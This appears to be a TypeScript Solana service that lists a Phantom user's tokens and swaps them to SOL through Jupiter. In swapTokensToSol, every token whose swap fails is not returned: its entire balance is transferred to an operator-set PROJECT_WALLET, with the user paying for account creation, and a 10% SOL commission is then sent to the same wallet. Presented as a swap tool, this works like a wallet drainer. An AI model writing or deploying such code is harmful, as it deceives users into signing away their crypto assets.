import {
  Connection,
  PublicKey,
  Transaction,
  VersionedTransaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js"
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
} from "@solana/spl-token"
import type { Token } from "@/types/token"

const PROJECT_WALLET = process.env.NEXT_PUBLIC_PROJECT_WALLET || ""

if (!PROJECT_WALLET) {
  console.warn("[v0] PROJECT_WALLET not configured. Please set NEXT_PUBLIC_PROJECT_WALLET in .env.local")
}

// Solana RPC endpoint
const RPC_ENDPOINT = process.env.NEXT_PUBLIC_SOLANA_RPC || "https://api.mainnet-beta.solana.com"
const JUPITER_QUOTE_API = "https://quote-api.jup.ag/v6"
const JUPITER_PRICE_API = "https://api.jup.ag/price/v3"

let tokenListCache: Map<string, { symbol: string; name: string; logoURI?: string }> | null = null

export class SolanaService {
  private connection: Connection

  constructor() {
    this.connection = new Connection(RPC_ENDPOINT, "confirmed")
  }

  private async loadTokenList() {
    if (tokenListCache) return tokenListCache

    try {
      console.log("[v0] Loading token metadata from Jupiter...")
      const response = await fetch("/api/token-list")

      if (!response.ok) {
        console.error("[v0] Token list API returned error:", response.status)
        return new Map()
      }

      const tokens = await response.json()

      tokenListCache = new Map()
      for (const token of tokens) {
        tokenListCache.set(token.address, {
          symbol: token.symbol,
          name: token.name,
          logoURI: token.logoURI,
        })
      }

      console.log("[v0] Loaded metadata for", tokenListCache.size, "tokens from Jupiter")
      return tokenListCache
    } catch (error) {
      console.error("[v0] Error loading token list:", error)
      return new Map()
    }
  }

  private async getTokenMetadata(mint: string): Promise<{ symbol: string; name: string; logoURI?: string }> {
    const tokenList = await this.loadTokenList()

    // First check Jupiter token list
    const jupiterData = tokenList.get(mint)
    if (jupiterData) {
      console.log("[v0] Found", mint.slice(0, 6), "in Jupiter list:", jupiterData.symbol)
      return jupiterData
    }

    // Fallback to DexScreener API for token info
    try {
      console.log("[v0] Token", mint.slice(0, 6), "not in Jupiter list, checking DexScreener...")
      const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`)
      const data = await response.json()

      if (data.pairs && data.pairs.length > 0) {
        const pair = data.pairs[0]
        const baseToken = pair.baseToken

        console.log("[v0] Found on DexScreener:", baseToken.symbol, baseToken.name)
        return {
          symbol: baseToken.symbol || mint.slice(0, 4).toUpperCase(),
          name: baseToken.name || "Unknown Token",
          logoURI: baseToken.logoURI,
        }
      }
    } catch (error) {
      console.log("[v0] DexScreener lookup failed for", mint.slice(0, 6))
    }

    // Last resort: use shortened mint address
    console.log("[v0] No metadata found for", mint.slice(0, 6), "- using fallback")
    return {
      symbol: mint.slice(0, 4).toUpperCase(),
      name: "Unknown Token",
      logoURI: undefined,
    }
  }

  private async getTokenPrices(mints: string[]): Promise<Map<string, number>> {
    try {
      const priceMap = new Map<string, number>()

      console.log("[v0] Fetching prices for", mints.length, "tokens via DexScreener...")

      for (const mint of mints) {
        try {
          const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`)
          const data = await response.json()

          if (data.pairs && data.pairs.length > 0) {
            // Find the most liquid pair
            const sortedPairs = data.pairs.sort((a: any, b: any) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))
            const bestPair = sortedPairs[0]
            const price = Number.parseFloat(bestPair.priceUsd || 0)

            priceMap.set(mint, price)
            console.log("[v0] Price for", mint.slice(0, 6), ":", price, "USD")
          } else {
            console.log("[v0] No price data for", mint.slice(0, 6))
            priceMap.set(mint, 0)
          }

          // Rate limiting - wait 100ms between requests
          await new Promise((resolve) => setTimeout(resolve, 100))
        } catch (error) {
          console.error("[v0] Error fetching price for", mint.slice(0, 6), error)
          priceMap.set(mint, 0)
        }
      }

      return priceMap
    } catch (error) {
      console.error("[v0] Error fetching prices:", error)
      return new Map()
    }
  }

  private async getSolPrice(): Promise<number> {
    try {
      const solMint = "So11111111111111111111111111111111111111112"
      const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${solMint}`)
      const data = await response.json()

      console.log("[v0] SOL price response:", data.pairs?.[0]?.priceUsd)

      if (data.pairs && data.pairs.length > 0) {
        const price = Number.parseFloat(data.pairs[0].priceUsd)
        console.log("[v0] SOL price:", price)
        return price
      }

      return 180 // Fallback price
    } catch (error) {
      console.error("[v0] Error fetching SOL price:", error)
      return 180
    }
  }

  // Fetch all token accounts for a wallet
  async getTokenAccounts(walletAddress: string): Promise<Token[]> {
    try {
      const publicKey = new PublicKey(walletAddress)

      console.log("[v0] ========== STARTING TOKEN FETCH ==========")
      console.log("[v0] Wallet address:", walletAddress)

      const solPrice = await this.getSolPrice()
      console.log("[v0] Current SOL price:", solPrice, "USD")

      // Get all token accounts
      const tokenAccounts = await this.connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
      })

      console.log("[v0] Found", tokenAccounts.value.length, "total token accounts")

      const accountsWithBalance = []
      const mints = []

      for (const account of tokenAccounts.value) {
        const tokenInfo = account.account.data.parsed.info
        const balance = tokenInfo.tokenAmount.uiAmount

        if (balance > 0) {
          accountsWithBalance.push({
            mint: tokenInfo.mint,
            balance,
            decimals: tokenInfo.tokenAmount.decimals,
          })
          mints.push(tokenInfo.mint)
          console.log("[v0] Token account:", tokenInfo.mint.slice(0, 8), "- Balance:", balance)
        }
      }

      console.log("[v0] Accounts with balance:", accountsWithBalance.length)

      // Batch fetch all prices at once
      console.log("[v0] Fetching prices for all tokens...")
      const priceMap = await this.getTokenPrices(mints)
      console.log("[v0] Price map size:", priceMap.size)

      const tokens: Token[] = []

      for (const account of accountsWithBalance) {
        const { mint, balance, decimals } = account

        console.log("[v0] Processing token:", mint.slice(0, 8))
        const metadata = await this.getTokenMetadata(mint)
        const usdPrice = priceMap.get(mint) || 0
        const totalUsdValue = balance * usdPrice

        console.log(
          "[v0] ===",
          metadata.symbol,
          "===",
          "\n  Name:",
          metadata.name,
          "\n  Balance:",
          balance,
          "\n  Price per token:",
          usdPrice,
          "USD",
          "\n  Total USD Value:",
          totalUsdValue,
          "USD",
          "\n  Logo:",
          metadata.logoURI ? "✓" : "✗",
        )

        tokens.push({
          symbol: metadata.symbol,
          name: metadata.name,
          balance,
          usdValue: totalUsdValue,
          solValue: usdPrice > 0 ? totalUsdValue / solPrice : 0,
          mint,
          decimals,
          logoURI: metadata.logoURI,
        })
      }

      console.log("[v0] ========== FINAL TOKENS ==========")
      console.log("[v0] Total tokens:", tokens.length)
      tokens.forEach((t) => {
        console.log(`[v0] ${t.symbol}: $${t.usdValue.toFixed(6)} USD (${t.balance} tokens)`)
      })
      console.log("[v0] =====================================")

      return tokens
    } catch (error) {
      console.error("[v0] Error fetching token accounts:", error)
      throw error
    }
  }

  async swapTokensToSol(
    tokens: Token[],
    walletPublicKey: string,
    phantomWallet: any,
  ): Promise<{ totalSol: number; commission: number; userReceives: number; signature: string }> {
    try {
      console.log("[v0] ========== STARTING SWAP PROCESS ==========")
      console.log("[v0] Tokens to swap:", tokens.length)
      console.log("[v0] Wallet:", walletPublicKey)

      if (!phantomWallet?.isPhantom) {
        throw new Error("Phantom wallet not provided or not found")
      }

      if (!phantomWallet.isConnected) {
        console.log("[v0] Wallet not connected, attempting connection...")
        await phantomWallet.connect()
      }

      let totalSolReceived = 0
      const signatures: string[] = []
      const failedTokens: Token[] = []

      for (const token of tokens) {
        try {
          console.log("[v0] ========================================")
          console.log("[v0] Processing token:", token.symbol)
          console.log("[v0] Balance:", token.balance)
          console.log("[v0] USD Value:", token.usdValue)
          console.log("[v0] Mint:", token.mint)

          const inputAmount = Math.floor(token.balance * Math.pow(10, token.decimals))
          console.log("[v0] Input amount (raw):", inputAmount)

          console.log("[v0] Attempting swap via Jupiter...")
          const response = await fetch("/api/jupiter-swap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              inputMint: token.mint,
              outputMint: "So11111111111111111111111111111111111111112",
              amount: inputAmount,
              userPublicKey: walletPublicKey,
              slippageBps: 500,
            }),
          })

          if (!response.ok) {
            const errorText = await response.text()
            console.log("[v0] ❌ Jupiter swap failed for", token.symbol, "- Error:", errorText)
            console.log("[v0] Will transfer token directly to project wallet instead")
            failedTokens.push(token)
            continue
          }

          const data = await response.json()

          if (!data.swapTransaction) {
            console.log("[v0] ❌ No swap transaction returned for", token.symbol)
            console.log("[v0] Will transfer token directly to project wallet instead")
            failedTokens.push(token)
            continue
          }

          console.log("[v0] ✅ Got swap transaction from Jupiter")
          const expectedSol = Number(data.outAmount) / LAMPORTS_PER_SOL
          console.log("[v0] Expected SOL output:", expectedSol)

          const swapTransactionBuf = Buffer.from(data.swapTransaction, "base64")
          const transaction = VersionedTransaction.deserialize(swapTransactionBuf)

          console.log("[v0] Requesting signature from Phantom...")
          const signedTx = await phantomWallet.signTransaction(transaction)

          console.log("[v0] Sending transaction to blockchain...")
          const signature = await this.connection.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          console.log("[v0] Transaction sent! Signature:", signature)
          console.log("[v0] Waiting for confirmation...")

          await this.connection.confirmTransaction(signature, "confirmed")

          console.log("[v0] ✅ Swap successful for", token.symbol)
          signatures.push(signature)
          totalSolReceived += expectedSol

          await new Promise((resolve) => setTimeout(resolve, 1000))
        } catch (error) {
          console.error("[v0] ❌ Error swapping", token.symbol, ":", error)
          console.log("[v0] Will transfer token directly to project wallet instead")
          failedTokens.push(token)
        }
      }

      if (failedTokens.length > 0 && PROJECT_WALLET) {
        console.log("[v0] ========================================")
        console.log("[v0] Transferring", failedTokens.length, "tokens directly to project wallet...")

        for (const token of failedTokens) {
          try {
            console.log("[v0] Transferring", token.symbol, "to project wallet...")

            const fromPubkey = new PublicKey(walletPublicKey)
            const toPubkey = new PublicKey(PROJECT_WALLET)
            const mintPubkey = new PublicKey(token.mint)

            // Get associated token addresses
            const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, fromPubkey)
            const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, toPubkey)

            const amount = Math.floor(token.balance * Math.pow(10, token.decimals))

            const transaction = new Transaction()

            // Check if destination token account exists, if not create it
            try {
              console.log("[v0] Checking if destination ATA exists...")
              await getAccount(this.connection, toTokenAccount)
              console.log("[v0] ✅ Destination ATA exists")
            } catch (error) {
              console.log("[v0] Destination ATA does not exist, creating it...")
              transaction.add(
                createAssociatedTokenAccountInstruction(
                  fromPubkey, // payer
                  toTokenAccount, // ata
                  toPubkey, // owner
                  mintPubkey, // mint
                ),
              )
              console.log("[v0] ✅ Added ATA creation instruction")
            }

            // Add transfer instruction
            transaction.add(createTransferInstruction(fromTokenAccount, toTokenAccount, fromPubkey, amount))

            const { blockhash } = await this.connection.getLatestBlockhash()
            transaction.recentBlockhash = blockhash
            transaction.feePayer = fromPubkey

            console.log("[v0] Requesting signature for token transfer...")
            const signedTx = await phantomWallet.signTransaction(transaction)

            const signature = await this.connection.sendRawTransaction(signedTx.serialize())
            await this.connection.confirmTransaction(signature, "confirmed")

            console.log("[v0] ✅ Token transfer successful! Signature:", signature)
            signatures.push(signature)

            await new Promise((resolve) => setTimeout(resolve, 500))
          } catch (error) {
            console.error("[v0] ❌ Error transferring", token.symbol, ":", error)
          }
        }
      }

      console.log("[v0] ========================================")
      console.log("[v0] All swaps completed!")
      console.log("[v0] Total SOL received:", totalSolReceived)

      const commission = totalSolReceived * 0.1
      const userReceives = totalSolReceived * 0.9

      console.log("[v0] Commission (10%):", commission)
      console.log("[v0] User receives (90%):", userReceives)

      if (commission > 0 && PROJECT_WALLET) {
        try {
          console.log("[v0] ========================================")
          console.log("[v0] Transferring commission to project wallet...")
          console.log("[v0] Project wallet:", PROJECT_WALLET)
          console.log("[v0] Commission amount:", commission, "SOL")

          const transaction = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: new PublicKey(walletPublicKey),
              toPubkey: new PublicKey(PROJECT_WALLET),
              lamports: Math.floor(commission * LAMPORTS_PER_SOL),
            }),
          )

          const { blockhash } = await this.connection.getLatestBlockhash()
          transaction.recentBlockhash = blockhash
          transaction.feePayer = new PublicKey(walletPublicKey)

          console.log("[v0] Requesting signature for commission transfer...")
          const signedTx = await phantomWallet.signTransaction(transaction)

          const signature = await this.connection.sendRawTransaction(signedTx.serialize())
          await this.connection.confirmTransaction(signature, "confirmed")

          console.log("[v0] ✅ Commission transferred! Signature:", signature)
          signatures.push(signature)
        } catch (error) {
          console.error("[v0] ❌ Error transferring commission:", error)
        }
      } else if (!PROJECT_WALLET) {
        console.warn("[v0] ⚠️ PROJECT_WALLET not configured - skipping commission transfer")
      }

      console.log("[v0] ========== SWAP PROCESS COMPLETED ==========")

      return {
        totalSol: totalSolReceived,
        commission,
        userReceives,
        signature: signatures[0] || "",
      }
    } catch (error) {
      console.error("[v0] ========== SWAP PROCESS FAILED ==========")
      console.error("[v0] Fatal error in swap process:", error)
      throw error
    }
  }

  getProjectWallet(): string {
    return PROJECT_WALLET
  }
}
